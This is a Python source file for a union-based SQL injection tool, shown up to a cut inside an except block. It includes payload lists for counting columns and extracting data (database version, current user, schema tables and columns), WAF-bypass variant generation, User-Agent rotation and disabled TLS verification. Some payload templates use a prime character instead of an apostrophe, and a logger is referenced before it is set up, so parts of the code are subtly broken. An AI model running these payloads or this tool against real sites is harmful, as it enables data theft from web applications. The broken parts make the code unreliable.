# union_based.py
# Advanced union-based SQL injection detector with column counting and data extraction

import statistics
import time
import requests
import urllib3
import random
import re
import math
from urllib.parse import urlparse, parse_qs, urlencode
from typing import Dict, List, Tuple, Optional, Union, Any
import json
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import logging
from datetime import datetime

# Import your modules
from user_agents import AdvancedUserAgentRotator
from payload_generator import BasicDetectionPayloads, AdvancedDetectionPayloads, EnhancedPayloadGenerator
from bypass import AdvancedWAFBypass, SmartWAFBypass, generate_smart_bypass_payloads

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Configuration / constants ------------------------------------------------
DEFAULT_SAMPLE_SIZE = 3
DEFAULT_CONFIDENCE_THRESHOLD = 0.8
MAX_PARALLEL_PAYLOADS = 8
DEFAULT_DELAY = 0.3
MAX_COLUMNS_TO_TEST = 20

# Detection modes
DETECTION_MODES = {
    'basic': 'Basic union payloads only',
    'basic_bypass': 'Basic payloads + WAF bypass',
    'advanced': 'Advanced union techniques',
    'advanced_bypass': 'Advanced techniques + WAF bypass'
}

# Database-specific UNION syntax
UNION_SYNTAX = {
    'mysql': {
        'union_operator': 'UNION',
        'all_supported': True,
        'distinct_supported': True,
        'null_supported': True,
        'comment_style': '--',
        'requires_from': False
    },
    'postgresql': {
        'union_operator': 'UNION',
        'all_supported': True,
        'distinct_supported': True,
        'null_supported': True,
        'comment_style': '--',
        'requires_from': False
    },
    'mssql': {
        'union_operator': 'UNION',
        'all_supported': True,
        'distinct_supported': True,
        'null_supported': True,
        'comment_style': '--',
        'requires_from': False
    },
    'oracle': {
        'union_operator': 'UNION',
        'all_supported': True,
        'distinct_supported': True,
        'null_supported': True,
        'comment_style': '--',
        'requires_from': True,  # Oracle often requires FROM DUAL
        'dual_table': 'FROM DUAL'
    },
    'sqlite': {
        'union_operator': 'UNION',
        'all_supported': True,
        'distinct_supported': True,
        'null_supported': True,
        'comment_style': '--',
        'requires_from': False
    }
}

# Union payload templates
UNION_PAYLOADS = {
    'column_counting': [
        "′ UNION SELECT NULL--",
        "′ UNION SELECT NULL,NULL--",
        "′ UNION SELECT NULL,NULL,NULL--",
        "′ UNION SELECT NULL,NULL,NULL,NULL--",
        "′ UNION SELECT NULL,NULL,NULL,NULL,NULL--"
    ],
    'basic_union': [
        "′ UNION SELECT 1--",
        "′ UNION SELECT 1,2--",
        "′ UNION SELECT 1,2,3--",
        "′ UNION SELECT 1,2,3,4--",
        "′ UNION SELECT 1,2,3,4,5--"
    ],
    'data_extraction': [
        "′ UNION SELECT @@version--",
        "′ UNION SELECT version()--",
        "′ UNION SELECT user()--",
        "′ UNION SELECT database()--",
        "′ UNION SELECT current_user--"
    ],
    'advanced_extraction': [
        "′ UNION SELECT table_name FROM information_schema.tables--",
        "′ UNION SELECT column_name FROM information_schema.columns--",
        "′ UNION SELECT name FROM sysdatabases--",
        "′ UNION SELECT datname FROM pg_database--"
    ],
    'union_all': [
        "′ UNION ALL SELECT 1--",
        "′ UNION ALL SELECT 1,2--",
        "′ UNION ALL SELECT 1,2,3--"
    ],
    'string_concat': [
        "′ UNION SELECT CONCAT('a','b')--",
        "′ UNION SELECT 'a'||'b'--",
        "′ UNION SELECT CONCAT(@@version,user())--"
    ]
}

# Response patterns for UNION detection
UNION_INDICATORS = {
    'numeric_indicators': ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'],
    'version_indicators': ['mysql', 'mariadb', 'postgresql', 'microsoft', 'oracle', 'sqlite'],
    'database_indicators': ['information_schema', 'sysdatabases', 'pg_catalog', 'all_tables'],
    'success_indicators': ['union', 'select', 'null', 'version', 'user', 'database'],
    'error_indicators': [
        'union', 'select', 'the used select statements have a different number of columns',
        'all queries combined using a union, intersect, or minus operator must have an equal number of expressions'
    ]
}

# --- Helper utilities --------------------------------------------------------
def detect_union_columns(response_text: str, payload: str) -> Dict[str, Any]:
    """Detect successful UNION column count from response."""
    indicators = {
        'column_count': 0,
        'confidence': 0.0,
        'indicators_found': [],
        'visible_columns': []
    }
    
    # Look for numeric indicators in response
    for i in range(1, 11):
        if str(i) in response_text:
            indicators['visible_columns'].append(i)
            indicators['confidence'] += 0.1
    
    # Check for NULL in response (Oracle sometimes shows NULL)
    if 'NULL' in response_text.upper():
        indicators['confidence'] += 0.2
        indicators['indicators_found'].append('NULL indicator')
    
    # Check for version information
    version_patterns = [
        r'\d+\.\d+\.\d+',  # Version numbers
        r'[0-9]+\.[0-9]+\.[0-9]+',
        r'Version [0-9]+\.[0-9]+'
    ]
    
    for pattern in version_patterns:
        if re.search(pattern, response_text):
            indicators['confidence'] += 0.3
            indicators['indicators_found'].append('Version information')
            break
    
    # Check for database names or users
    db_indicators = ['root@', 'localhost', 'postgres', 'sa@', 'system']
    for indicator in db_indicators:
        if indicator.lower() in response_text.lower():
            indicators['confidence'] += 0.2
            indicators['indicators_found'].append(f'Database indicator: {indicator}')
            break
    
    # Extract column count from payload
    if 'NULL' in payload.upper():
        null_count = payload.upper().count('NULL')
        indicators['column_count'] = null_count
        indicators['confidence'] += min(0.5, null_count * 0.1)
    
    return indicators

def generate_union_payload(column_count: int, db_type: str, payload_type: str = 'basic') -> str:
    """Generate UNION payload for specific column count and database."""
    base_payload = "′ UNION SELECT "
    
    if payload_type == 'null_test':
        # NULL-based column counting
        columns = ['NULL'] * column_count
        payload = base_payload + ','.join(columns)
    
    elif payload_type == 'numeric_test':
        # Numeric values for visible columns
        columns = [str(i+1) for i in range(column_count)]
        payload = base_payload + ','.join(columns)
    
    elif payload_type == 'data_extraction':
        # Mix of data types for extraction
        columns = []
        for i in range(column_count):
            if i == 0:
                if db_type == 'mysql':
                    columns.append('@@version')
                elif db_type == 'postgresql':
                    columns.append('version()')
                elif db_type == 'mssql':
                    columns.append('@@version')
                elif db_type == 'oracle':
                    columns.append("banner FROM v$version")
                else:
                    columns.append('1')
            elif i == 1:
                if db_type == 'mysql':
                    columns.append('user()')
                elif db_type == 'postgresql':
                    columns.append('current_user')
                elif db_type == 'mssql':
                    columns.append('user_name()')
                elif db_type == 'oracle':
                    columns.append('user FROM dual')
                else:
                    columns.append('2')
            else:
                columns.append(str(i+1))
        payload = base_payload + ','.join(columns)
    
    else:
        # Default to numeric
        columns = [str(i+1) for i in range(column_count)]
        payload = base_payload + ','.join(columns)
    
    # Add database-specific syntax
    if db_type == 'oracle' and UNION_SYNTAX['oracle']['requires_from']:
        if 'FROM' not in payload.upper():
            payload += ' FROM DUAL'
    
    # Add comment
    payload += UNION_SYNTAX.get(db_type, {}).get('comment_style', '--')
    
    return payload

def analyze_union_response(response_text: str, original_length: int, payload: str) -> Dict[str, Any]:
    """Analyze response for successful UNION injection indicators."""
    analysis = {
        'success': False,
        'confidence': 0.0,
        'indicators': [],
        'data_found': False,
        'column_count_detected': 0,
        'response_change': 0.0
    }
    
    # Calculate response change
    current_length = len(response_text)
    if original_length > 0:
        length_change = abs(current_length - original_length) / original_length
        analysis['response_change'] = length_change
        
        if length_change > 0.1:  # Significant change
            analysis['confidence'] += 0.3
            analysis['indicators'].append(f"Significant response change: {length_change:.2f}")
    
    # Check for numeric indicators from UNION SELECT 1,2,3...
    numeric_matches = re.findall(r'\b[1-9]\b', response_text)
    if numeric_matches:
        analysis['confidence'] += min(0.4, len(numeric_matches) * 0.1)
        analysis['indicators'].append(f"Numeric indicators found: {set(numeric_matches)}")
        analysis['column_count_detected'] = max([int(n) for n in numeric_matches] + [0])
    
    # Check for database information
    db_info_indicators = [
        'version', 'mysql', 'postgresql', 'microsoft', 'oracle',
        'database', 'user', 'root', 'localhost', 'schema'
    ]
    
    for indicator in db_info_indicators:
        if indicator.lower() in response_text.lower():
            analysis['confidence'] += 0.2
            analysis['indicators'].append(f"Database info: {indicator}")
            analysis['data_found'] = True
    
    # Check for SQL keywords in response (might indicate error or success)
    sql_keywords = ['select', 'union', 'null', 'from', 'where']
    for keyword in sql_keywords:
        if keyword in response_text.lower():
            analysis['confidence'] += 0.1
            analysis['indicators'].append(f"SQL keyword: {keyword}")
    
    # Check for specific payload results
    if '@@version' in payload and any(v in response_text.lower() for v in ['5.', '8.', '10.', '11.']):
        analysis['confidence'] += 0.5
        analysis['indicators'].append("Version information extracted")
        analysis['data_found'] = True
    
    if 'user()' in payload and any(u in response_text.lower() for u in ['root', 'admin', 'sa', 'postgres']):
        analysis['confidence'] += 0.4
        analysis['indicators'].append("User information extracted")
        analysis['data_found'] = True
    
    # Determine success
    analysis['success'] = analysis['confidence'] >= 0.5
    
    return analysis

# --- Enhanced HTTP Session ---------------------------------------------------
class ResilientHTTPSession:
    """HTTP session with retry logic and connection pooling."""
    
    def __init__(self, max_retries: int = 3, backoff_factor: float = 0.5):
        self.session = requests.Session()
        self.max_retries = max_retries
        self.backoff_factor = backoff_factor
        self._setup_session()
    
    def _setup_session(self):
        """Configure session with retry strategy."""
        retry_strategy = Retry(
            total=self.max_retries,
            backoff_factor=self.backoff_factor,
            status_forcelist=[429, 500, 502, 503, 504, 403],
            allowed_methods=["GET", "POST"]
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=20)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Default headers
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
    
    def request(self, method: str, url: str, **kwargs) -> requests.Response:
        """Make HTTP request with enhanced error handling."""
        # Ensure verify=False for SSL
        kwargs['verify'] = False
        kwargs['timeout'] = kwargs.get('timeout', 30)
        kwargs['allow_redirects'] = kwargs.get('allow_redirects', False)
        
        return self.session.request(method, url, **kwargs)
    
    def close(self):
        """Close session."""
        self.session.close()

# --- Column Counter ----------------------------------------------------------
class UnionColumnCounter:
    """Advanced UNION column counting with multiple techniques."""
    
    def __init__(self, http_session, logger):
        self.http_session = http_session
        self.logger = logger
        self.column_counts = {}
    
    def count_columns_order_by(self, url: str, parameter: str, original_value: str, 
                             method: str = 'GET', headers: Dict = None, 
                             data: Any = None, cookies: Dict = None) -> int:
        """Count columns using ORDER BY technique."""
        self.logger.info("Counting columns using ORDER BY technique...")
        
        for column_num in range(1, MAX_COLUMNS_TO_TEST + 1):
            payload = f"{original_value}' ORDER BY {column_num}--"
            
            test_url, test_method, test_headers, test_data = self._build_request(
                url, method, headers, data, parameter, payload
            )
            
            ok, response_text, status_code, _ = self._send_request(
                test_url, test_method, test_headers, test_data, cookies
            )
            
            if not ok or status_code >= 500:
                self.logger.info(f"Found column count: {column_num - 1}")
                return column_num - 1
            
            # Check for error indicating invalid column
            error_indicators = [
                'unknown column', 'invalid column', 'order by',
                'column number', 'out of range'
            ]
            
            if any(error in response_text.lower() for error in error_indicators):
                self.logger.info(f"Found column count: {column_num - 1}")
                return column_num - 1
        
        self.logger.info(f"Maximum columns tested: {MAX_COLUMNS_TO_TEST}")
        return MAX_COLUMNS_TO_TEST
    
    def count_columns_union(self, url: str, parameter: str, original_value: str,
                          method: str = 'GET', headers: Dict = None,
                          data: Any = None, cookies: Dict = None, db_type: str = 'mysql') -> int:
        """Count columns using UNION SELECT NULL technique."""
        self.logger.info("Counting columns using UNION SELECT NULL technique...")
        
        for column_count in range(1, MAX_COLUMNS_TO_TEST + 1):
            # Generate NULL-based UNION payload
            nulls = ['NULL'] * column_count
            payload = f"{original_value}' UNION SELECT {','.join(nulls)}"
            
            # Add database-specific syntax
            if db_type == 'oracle' and UNION_SYNTAX['oracle']['requires_from']:
                payload += ' FROM DUAL'
            
            payload += UNION_SYNTAX.get(db_type, {}).get('comment_style', '--')
            
            test_url, test_method, test_headers, test_data = self._build_request(
                url, method, headers, data, parameter, payload
            )
            
            ok, response_text, status_code, _ = self._send_request(
                test_url, test_method, test_headers, test_data, cookies
            )
            
            if ok and status_code == 200:
                # Check if UNION worked (no error about column count mismatch)
                error_indicators = [
                    'the used select statements have a different number of columns',
                    'all queries combined using a union',
                    'union'
                ]
                
                if not any(error in response_text.lower() for error in error_indicators):
                    self.logger.info(f"Found column count: {column_count}")
                    return column_count
        
        self.logger.warning("Could not determine column count using UNION NULL method")
        return 0
    
    def _build_request(self, url: str, method: str, headers: Dict, 
                     data: Any, parameter: str, payload: str) -> Tuple[str, str, Dict, Any]:
        """Build test request with payload."""
        test_url = url
        test_method = method
        test_headers = headers.copy() if headers else {}
        test_data = data.copy() if hasattr(data, 'copy') else data

        if method.upper() == 'GET':
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            query_params[parameter] = [payload]
            new_query = urlencode(query_params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        else:
            content_type = test_headers.get('Content-Type', '')
            
            if 'application/json' in content_type:
                if isinstance(test_data, str):
                    try:
                        json_data = json.loads(test_data)
                        if parameter in json_data:
                            json_data[parameter] = payload
                        test_data = json.dumps(json_data)
                    except json.JSONDecodeError:
                        test_data = test_data.replace(f'"{parameter}"', f'"{payload}"')
                else:
                    if parameter in test_data:
                        test_data[parameter] = payload
                    
            elif isinstance(test_data, dict):
                test_data[parameter] = payload
                
            elif isinstance(test_data, str):
                test_data = test_data.replace(f"{parameter}=", f"{parameter}={payload}")

        return test_url, test_method, test_headers, test_data
    
    def _send_request(self, url: str, method: str, headers: Dict, 
                    data: Any, cookies: Dict) -> Tuple[bool, str, int, str]:
        """Send HTTP request."""
        try:
            if method.upper() == 'GET':
                resp = self.http_session.request('GET', url, headers=headers, cookies=cookies, timeout=30)
            else:
                resp = self.http_session.request(method, url, headers=headers, cookies=cookies, data=data, timeout=30)
            
            return True, resp.text, resp.status_code, resp.headers.get('Content-Type', '')
            
        except Exception as e:
            return False, str(e), 0, ""

# --- Main Detector -----------------------------------------------------------
class AdvancedUnionBasedDetector:
    """
    Advanced Union-Based SQL Injection Detector.
    """

    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.sample_size = self.config.get('sample_size', DEFAULT_SAMPLE_SIZE)
        self.confidence_threshold = self.config.get('confidence_threshold', DEFAULT_CONFIDENCE_THRESHOLD)
        self.max_response_time = self.config.get('max_response_time', 30)
        self.max_payloads_per_param = self.config.get('max_payloads_per_param', 15)
        self.detection_mode = self.config.get('detection_mode', 'advanced_bypass')
        self.use_smart_bypass = self.config.get('use_smart_bypass', False)
        self.payloads_directory = self.config.get('payloads_directory', 'payloads')
        self.delay = self.config.get('delay', DEFAULT_DELAY)

        # Initialize components
        self._initialize_components()
        
        # HTTP session
        self.http_session = ResilientHTTPSession(
            max_retries=self.config.get('max_retries', 3),
            backoff_factor=self.config.get('backoff_factor', 0.5)
        )

        # Column counter
        self.column_counter = UnionColumnCounter(self.http_session, self.logger)

        # Internal state
        self.request_history: List[Dict[str, Any]] = []
        self.baseline_responses: List[Dict] = []
        self.column_counts: Dict[str, int] = {}  # parameter -> column_count
        self.detected_databases: List[str] = []
        self.learning_data = []

        # Logging
        self.logger = self._setup_logging()
        self.logger.info(f"Initialized union-based detector with mode: {self.detection_mode}")

    def _initialize_components(self):
        """Initialize detection components based on selected mode."""
        # Always initialize these
        self.ua_rotator = AdvancedUserAgentRotator()
        self.waf_bypass = AdvancedWAFBypass()
        self.smart_bypass = SmartWAFBypass() if self.use_smart_bypass else None
        
        # Initialize payload sources based on mode
        if self.detection_mode in ['basic', 'basic_bypass']:
            self.payload_source = BasicDetectionPayloads()
            self.advanced_payloads = None
            self.payload_generator = None
        else:
            self.payload_source = BasicDetectionPayloads()  # Fallback
            self.advanced_payloads = AdvancedDetectionPayloads(self.payloads_directory)
            self.payload_generator = EnhancedPayloadGenerator(
                use_bypass=(self.detection_mode == 'advanced_bypass'),
                payloads_directory=self.payloads_directory,
                smart_learning=self.use_smart_bypass
            )

    def _setup_logging(self):
        logger = logging.getLogger('AdvancedUnionBasedDetector')
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

    # ----------------- Payload Management -------------------
    def _collect_union_payloads(self, db_hint: str = 'auto', column_count: int = 0) -> List[Dict[str, Any]]:
        """Collect union-based payloads based on detection mode and column count."""
        payloads = []
        
        if self.detection_mode in ['basic', 'basic_bypass']:
            payloads = self._get_basic_union_payloads(db_hint, column_count)
        else:
            payloads = self._get_advanced_union_payloads(db_hint, column_count)
        
        # Apply bypass if enabled in mode
        if self.detection_mode in ['basic_bypass', 'advanced_bypass']:
            payloads = self._apply_bypass_to_payloads(payloads)
        
        return payloads[:self.max_payloads_per_param]

    def _get_basic_union_payloads(self, db_hint: str, column_count: int) -> List[Dict[str, Any]]:
        """Get basic union-based payloads."""
        payloads = []
        
        target_dbs = [db_hint] if db_hint != 'auto' else ['mysql', 'postgresql', 'mssql', 'oracle', 'sqlite']
        
        for db_type in target_dbs:
            # Generate payloads for different column counts
            column_counts_to_test = [column_count] if column_count > 0 else [3, 4, 5, 6]
            
            for col_count in column_counts_to_test:
                for payload_type in ['null_test', 'numeric_test', 'data_extraction']:
                    payload_text = generate_union_payload(col_count, db_type, payload_type)
                    
                    payloads.append({
                        'payload': payload_text,
                        'db': db_type,
                        'column_count': col_count,
                        'payload_type': payload_type,
                        'base_confidence': 0.7,
                        'description': f"{db_type} {payload_type} ({col_count} cols)",
                        'source': 'basic'
                    })
        
        return payloads

    def _get_advanced_union_payloads(self, db_hint: str, column_count: int) -> List[Dict[str, Any]]:
        """Get advanced union-based payloads."""
        payloads = []
        
        if not self.advanced_payloads:
            return self._get_basic_union_payloads(db_hint, column_count)
        
        # Get union-specific payloads
        union_payloads = self.advanced_payloads.get_payloads_by_attack_type('union')
        
        for category, payload_list in union_payloads.items():
            for p in payload_list:
                if 'UNION' in p.upper() and 'SELECT' in p.upper():
                    # Determine database type
                    db_type = self._detect_db_from_payload(p)
                    if db_hint != 'auto' and db_type != db_hint:
                        continue
                    
                    payloads.append({
                        'payload': p,
                        'db': db_type,
                        'column_count': 0,  # Will be determined dynamically
                        'payload_type': 'advanced',
                        'base_confidence': 0.8,
                        'description': f"Advanced {category}",
                        'source': 'advanced'
                    })
        
        # Generate dynamic payloads based on column count
        if column_count > 0:
            dynamic_payloads = self._generate_dynamic_union_payloads(column_count, db_hint)
            payloads.extend(dynamic_payloads)
        
        # Add basic payloads as fallback
        if not payloads:
            payloads = self._get_basic_union_payloads(db_hint, column_count)
        
        return payloads

    def _detect_db_from_payload(self, payload: str) -> str:
        """Detect database type from payload content."""
        payload_upper = payload.upper()
        
        if 'FROM DUAL' in payload_upper or "banner FROM v$version" in payload_upper:
            return 'oracle'
        elif '@@version' in payload_upper or 'sysdatabases' in payload_upper:
            return 'mssql'
        elif 'version()' in payload_upper or 'pg_' in payload_upper:
            return 'postgresql'
        elif 'sqlite_master' in payload_upper:
            return 'sqlite'
        else:
            return 'mysql'  # Default to MySQL

    def _generate_dynamic_union_payloads(self, column_count: int, db_hint: str) -> List[Dict[str, Any]]:
        """Generate dynamic union payloads for specific column count."""
        payloads = []
        target_dbs = [db_hint] if db_hint != 'auto' else ['mysql', 'postgresql', 'mssql']
        
        for db_type in target_dbs:
            # Data extraction payloads
            extraction_payloads = [
                generate_union_payload(column_count, db_type, 'data_extraction'),
                f"′ UNION SELECT {','.join([f'CONCAT({i})' for i in range(1, column_count + 1)])}--"
            ]
            
            if db_type == 'mysql':
                extraction_payloads.append(
                    f"′ UNION SELECT {','.join([f'@@version' if i == 1 else str(i) for i in range(1, column_count + 1)])}--"
                )
            
            for payload in extraction_payloads:
                payloads.append({
                    'payload': payload,
                    'db': db_type,
                    'column_count': column_count,
                    'payload_type': 'dynamic_extraction',
                    'base_confidence': 0.85,
                    'description': f"Dynamic {db_type} extraction",
                    'source': 'dynamic'
                })
        
        return payloads

    def _apply_bypass_to_payloads(self, original_payloads: List[Dict]) -> List[Dict]:
        """Apply WAF bypass techniques to union payloads."""
        bypassed_payloads = []
        
        for original in original_payloads[:10]:  # Limit for performance
            raw_payload = original['payload']
            
            # Apply smart bypass if enabled
            if self.use_smart_bypass and self.smart_bypass:
                try:
                    smart_variants = self.smart_bypass.get_optimized_bypass(raw_payload, self.waf_bypass)
                    for variant in smart_variants[:2]:
                        bypassed_payloads.append({
                            'payload': variant,
                            'db': original['db'],
                            'column_count': original['column_count'],
                            'payload_type': original['payload_type'],
                            'base_confidence': original['base_confidence'] * 0.95,
                            'description': original['description'] + ' (smart bypass)',
                            'source': original['source'] + '_bypass'
                        })
                except Exception as e:
                    self.logger.debug(f"Smart bypass failed: {e}")
            
            # Apply standard bypass techniques
            try:
                bypass_variants = self.waf_bypass.apply_all_bypasses(raw_payload, max_variations=2)
                for variant in bypass_variants:
                    if variant not in [p['payload'] for p in bypassed_payloads]:
                        bypassed_payloads.append({
                            'payload': variant,
                            'db': original['db'],
                            'column_count': original['column_count'],
                            'payload_type': original['payload_type'],
                            'base_confidence': original['base_confidence'] * 0.9,
                            'description': original['description'] + ' (bypass)',
                            'source': original['source'] + '_bypass'
                        })
            except Exception as e:
                self.logger.debug(f"Standard bypass failed: {e}")
        
        # Combine original and bypassed payloads
        all_payloads = original_payloads + bypassed_payloads
        
        # Deduplicate
        seen = set()
        deduped = []
        for pl in all_payloads:
            if pl['payload'] not in seen:
                deduped.append(pl)
                seen.add(pl['payload'])
        
        return deduped

    # ----------------- HTTP Communication -------------------
    def _prepare_headers(self, headers: Optional[Dict[str,str]] = None) -> Dict[str,str]:
        """Prepare headers with User-Agent rotation."""
        headers = (headers or {}).copy()
        if 'User-Agent' not in headers:
            ua = self.ua_rotator.get_user_agent()
            headers['User-Agent'] = ua
        return headers

    def _send_request(self, url: str, method: str = 'GET', headers: Dict = None, 
                     data: Any = None, cookies: Dict = None, safe_mode: bool = False, 
                     timeout: Optional[int] = None) -> Tuple[bool, str, int, str]:
        """Send HTTP request with comprehensive error handling."""
        if timeout is None:
            timeout = self.max_response_time

        headers = self._prepare_headers(headers)
        cookies = cookies or {}
        start = time.time()

        try:
            if method.upper() == 'GET':
                resp = self.http_session.request('GET', url, headers=headers, cookies=cookies, timeout=timeout)
            elif method.upper() == 'POST':
                ct = headers.get('Content-Type', '')
                if 'application/json' in ct and isinstance(data, (dict, list)):
                    payload = json.dumps(data)
                    resp = self.http_session.request('POST', url, headers=headers, cookies=cookies, data=payload, timeout=timeout)
                else:
                    resp = self.http_session.request('POST', url, headers=headers, cookies=cookies, data=data, timeout=timeout)
            else:
                resp = self.http_session.request(method, url, headers=headers, cookies=cookies, data=data, timeout=timeout)

            response_text = resp.text
            rt = time.time() - start
            
            if not safe_mode:
                self.request_history.append({
                    'timestamp': datetime.now(),
                    'response_time': rt,
                    'status_code': resp.status_code,
                    'url': url
                })
                
                # Collect learning data for smart bypass
                if self.use_smart_bypass:
                    self.learning_data.append((url, resp.status_code, resp.text))

            return True, response_text, resp.status_code, resp.headers.get('Content-Type', '')
            
        except requests.exceptions.Timeout:
            rt = time.time() - start
            self.logger.debug(f"Request timeout after {rt:.2f}s: {url}")
            return False, "Timeout", 0, ""
        except requests.RequestException as e:
            rt = time.time() - start
            self.logger.debug(f"Request failed: {e}")
            return False, str(e), 0, ""
        except Exception as e:
            rt = time.time() - start
            self.logger.debug(f"Unexpected error: {e}")
            return False, str(e), 0, ""

    # ----------------- Column Counting -------------------
    def determine_column_count(self, url: str, parameter: str, original_value: str,
                             method: str = 'GET', headers: Dict = None,
                             data: Any = None, cookies: Dict = None, db_type: str = 'mysql') -> int:
        """Determine the number of columns using multiple techniques."""
        self.logger.info(f"Determining column count for parameter: {parameter}")
        
        # Try ORDER BY method first
        column_count = self.column_counter.count_columns_order_by(
            url, parameter, original_value, method, headers, data, cookies
        )
        
        if column_count > 0:
            self.column_counts[parameter] = column_count
            return column_count
        
        # Fall back to UNION SELECT NULL method
        column_count = self.column_counter.count_columns_union(
            url, parameter, original_value, method, headers, data, cookies, db_type
        )
        
        if column_count > 0:
            self.column_counts[parameter] = column_count
        else:
            self.logger.warning(f"Could not determine column count for {parameter}, using default 3")
            column_count = 3
        
        return column_count

    # ----------------- Injection Helpers -------------------
    def _build_test_request(self, url: str, method: str, headers: Dict, 
                          data: Any, parameter: str, payload: str) -> Tuple[str, str, Dict, Any]:
        """Build test request with union payload."""
        test_url = url
        test_method = method
        test_headers = headers.copy()
        test_data = data.copy() if hasattr(data, 'copy') else data

        if method.upper() == 'GET':
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            
            # Inject union payload into parameter
            if parameter in query_params:
                original_value = query_params[parameter][0]
                query_params[parameter] = [original_value + payload]
            else:
                query_params[parameter] = [payload]
            
            new_query = urlencode(query_params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        else:
            content_type = test_headers.get('Content-Type', '')
            
            if 'application/json' in content_type:
                if isinstance(test_data, str):
                    try:
                        json_data = json.loads(test_data)
                        if parameter in json_data:
                            original_value = json_data[parameter]
                            json_data[parameter] = str(original_value) + payload
                        test_data = json.dumps(json_data)
                    except json.JSONDecodeError:
                        test_data = test_data.replace(f'"{parameter}"', f'"{parameter}{payload}"')
                else:
                    if parameter in test_data:
                        original_value = test_data[parameter]
                        test_data[parameter] = str(original_value) + payload
                    
            elif isinstance(test_data, dict):
                if parameter in test_data:
                    original_value = test_data[parameter]
                    test_data[parameter] = str(original_value) + payload
                
            elif isinstance(test_data, str):
                test_data = test_data.replace(f"{parameter}=", f"{parameter}={payload}")

        return test_url, test_method, test_headers, test_data

    # ----------------- Core Testing Logic -------------------
    def _test_single_payload(self, test_url: str, method: str, headers: Dict, 
                           data: Any, cookies: Dict, payload_info: Dict, 
                           baseline_length: int) -> Dict[str, Any]:
        """Test a single union payload."""
        payload = payload_info['payload']
        payload_responses = []
        response_times = []
        
        for i in range(self.sample_size):
            try:
                start = time.time()
                ok, response_text, sc, content_type = self._send_request(
                    test_url, method, headers=headers, data=data, cookies=cookies
                )
                rt = time.time() - start
                response_times.append(rt)
                
                if ok:
                    response_data = {
                        'text': response_text,
                        'status_code': sc,
                        'content_type': content_type
                    }
                    payload_responses.append(response_data)
                
                time.sleep(self.delay + random.random() * 0.2)
            except Exception as e:
                self.logger.debug(f"Test request {i+1} failed: {e}")
                continue

        # Analyze responses
        analysis_results = []
        for response in payload_responses:
            analysis = analyze_union_response(
                response['text'], 
                baseline_length,
                payload
            )
            analysis_results.append(analysis)
        
        # Aggregate results
        if analysis_results:
            max_confidence = max(result['confidence'] for result in analysis_results)
            avg_confidence = statistics.mean(result['confidence'] for result in analysis_results)
            successful_count = sum(1 for result in analysis_results if result['success'])
        else:
            max_confidence = 0.0
            avg_confidence = 0.0
            successful_count = 0

        return {
            'payload': payload,
            'payload_info': payload_info,
            'payload_responses': payload_responses,
            'analysis_results': analysis_results,
            'response_times': response_times,
            'max_confidence': max_confidence,
            'avg_confidence': avg_confidence,
            'successful_samples': successful_count,
            'total_samples': len(payload_responses)
        }

    def test_parameter(self, url: str, parameter: str, value: str = 'test', 
                     method: str = 'GET', headers: Dict = None, data: Any = None, 
                     cookies: Dict = None, database_type: str = 'auto') -> Dict[str, Any]:
        """Test a specific parameter for union-based SQL injection."""
        self.logger.info(f"Testing parameter '{parameter}' for union-based SQLi with mode: {self.detection_mode}")
        
        headers = self._prepare_headers(headers)
        cookies = cookies or {}
        original_data = data.copy() if hasattr(data, 'copy') else data

        # Get baseline response length
        baseline_length = 0
        if not self.baseline_responses:
            self.calculate_baseline(url, method, headers, original_data, cookies)
        
        if self.baseline_responses:
            baseline_length = len(self.baseline_responses[0].get('text', ''))

        # Determine column count if not already known
        column_count = self.column_counts.get(parameter, 0)
        if column_count == 0:
            column_count = self.determine_column_count(
                url, parameter, value, method, headers, original_data, cookies, database_type
            )

        # Get payloads based on detection mode and column count
        all_payloads = self._collect_union_payloads(database_type, column_count)
        
        self.logger.info(f"Testing {len(all_payloads)} union payload variants for parameter '{parameter}' (columns: {column_count})")

        results_details = []
        vulnerable_payloads = []

        # Test payloads with threading
        with ThreadPoolExecutor(max_workers=min(MAX_PARALLEL_PAYLOADS, len(all_payloads) or 1)) as executor:
            future_to_payload = {}
            
            for pl in all_payloads:
                test_url, test_method, test_headers, test_data = self._build_test_request(
                    url, method, headers, original_data, parameter, pl['payload']
                )
                
                future = executor.submit(
                    self._test_single_payload, test_url, test_method, test_headers, 
                    test_data, cookies, pl, baseline_length
                )
                future_to_payload[future] = pl

            for future in as_completed(future_to_payload):
                pl = future_to_payload[future]
                try:
                    result = future.result()
                    
                    combined_conf = result['max_confidence'] * pl['base_confidence']
                    
                    result_entry = {
                        'payload': pl['payload'],
                        'database_type': pl['db'],
                        'column_count': pl['column_count'],
                        'description': pl.get('description', ''),
                        'payload_type': pl.get('payload_type', 'basic'),
                        'analysis_results': result['analysis_results'],
                        'max_confidence': result['max_confidence'],
                        'avg_confidence': result['avg_confidence'],
                        'successful_samples': result['successful_samples'],
                        'total_samples': result['total_samples'],
                        'combined_confidence': combined_conf,
                        'detection_mode': self.detection_mode,
                        'vulnerable': False
                    }

                    if (combined_conf >= self.confidence_threshold and 
                        result['successful_samples'] >= max(2, int(self.sample_size * 0.5))):
                        result_entry['vulnerable'] = True
                        vulnerable_payloads.append(result_entry)

                    results_details.append(result_entry)
                    
                    self.logger.info(
                        f"Payload tested: max_conf={result['max_confidence']:.3f}, "
                        f"combined={combined_conf:.3f}, vulnerable={result_entry['vulnerable']}"
                    )
                    
                except Exception as e:
